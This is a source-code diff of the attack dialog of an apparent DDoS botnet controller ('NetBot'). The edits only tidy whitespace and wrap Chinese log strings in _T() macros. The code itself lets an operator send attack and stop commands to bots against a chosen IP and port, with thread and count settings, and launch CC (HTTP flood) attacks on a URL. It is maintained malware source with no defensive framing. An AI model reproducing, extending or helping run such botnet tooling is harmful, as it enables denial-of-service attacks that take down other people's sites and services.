@@ -178,7 +178,7 @@ BOOL CDDosDlg::PreTranslateMessage(MSG* pMsg)
 		int nVirtKey = (int)pMsg->wParam;
 		if (nVirtKey == VK_RETURN)
 		{
-			//如果是回车在这里做你要做的事情,或者什么也不作   
+			//如果是回车在这里做你要做的事情,或者什么也不作
 			return TRUE;
 		}
 		if (nVirtKey == VK_ESCAPE)
@@ -212,7 +212,7 @@ void CDDosDlg::OnBtnAttack()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(0, m_IP, m_Port, m_Type + 1, m_Thread, m_Num, m_bAutoAttack);
 	//output message
 	CString Msg;
-	Msg.Format(">>>>成功发送%d条[攻击]命令", iRet);
+	Msg.Format(_T(">>>>成功发送%d条[攻击]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 }
 
@@ -221,7 +221,7 @@ void CDDosDlg::OnBtnStop()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(0);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[停止]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[停止]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 
 	GetDlgItem(IDC_BTN_ATTACK)->EnableWindow(TRUE);
@@ -246,7 +246,7 @@ void CDDosDlg::OnBtnAttack1()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(1, m_IP1, m_Port1, m_Type1 + 1, m_Thread1, m_Num1);
 	//output message
 	CString Msg;
-	Msg.Format(">>>>成功发送%d条[攻击]命令", iRet);
+	Msg.Format(_T(">>>>成功发送%d条[攻击]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 }
 
@@ -255,7 +255,7 @@ void CDDosDlg::OnBtnStop1()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(1);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[停止]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[停止]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 
 	GetDlgItem(IDC_BTN_ATTACK1)->EnableWindow(TRUE);
@@ -280,7 +280,7 @@ void CDDosDlg::OnBtnAttack2()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(2, m_IP2, m_Port2, m_Type2 + 1, m_Thread2, m_Num2);
 	//output message
 	CString Msg;
-	Msg.Format(">>>>成功发送%d条[攻击]命令", iRet);
+	Msg.Format(_T(">>>>成功发送%d条[攻击]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 }
 
@@ -289,7 +289,7 @@ void CDDosDlg::OnBtnStop2()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(2);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[停止]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[停止]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 
 	GetDlgItem(IDC_BTN_ATTACK2)->EnableWindow(TRUE);
@@ -314,7 +314,7 @@ void CDDosDlg::OnBtnAttack3()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(3, m_IP3, m_Port3, m_Type3 + 1, m_Thread3, m_Num3);
 	//output message
 	CString Msg;
-	Msg.Format(">>>>成功发送%d条[攻击]命令", iRet);
+	Msg.Format(_T(">>>>成功发送%d条[攻击]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 }
 
@@ -323,7 +323,7 @@ void CDDosDlg::OnBtnStop3()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(3);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[停止]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[停止]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 
 	GetDlgItem(IDC_BTN_ATTACK3)->EnableWindow(TRUE);
@@ -348,7 +348,7 @@ void CDDosDlg::OnBtnAttack4()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackTask(4, m_IP4, m_Port4, m_Type4 + 1, m_Thread4, m_Num4);
 	//output message
 	CString Msg;
-	Msg.Format(">>>>成功发送%d条[攻击]命令", iRet);
+	Msg.Format(_T(">>>>成功发送%d条[攻击]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 }
 
@@ -357,7 +357,7 @@ void CDDosDlg::OnBtnStop4()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(4);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[停止]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[停止]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 
 	GetDlgItem(IDC_BTN_ATTACK4)->EnableWindow(TRUE);
@@ -393,7 +393,7 @@ void CDDosDlg::OnBtnCcAttack()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackSpiderCC(5, m_CCUrl, m_CCPort, m_CCThread, m_CCNum, m_CCParamX, m_CCParamY);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[攻击]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[攻击]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 }
 
@@ -402,7 +402,7 @@ void CDDosDlg::OnBtnCcStop()
 	int iRet = ((CNetBotDlg *)AfxGetMainWnd())->AttackStop(5);
 	//output message
 	CString Msg;
-	Msg.Format("<<<<成功发送%d条[停止]命令", iRet);
+	Msg.Format(_T("<<<<成功发送%d条[停止]命令"), iRet);
 	m_LogList.InsertString(0, Msg);
 
 	GetDlgItem(IDC_BTN_CC_ATTACK)->EnableWindow(TRUE);
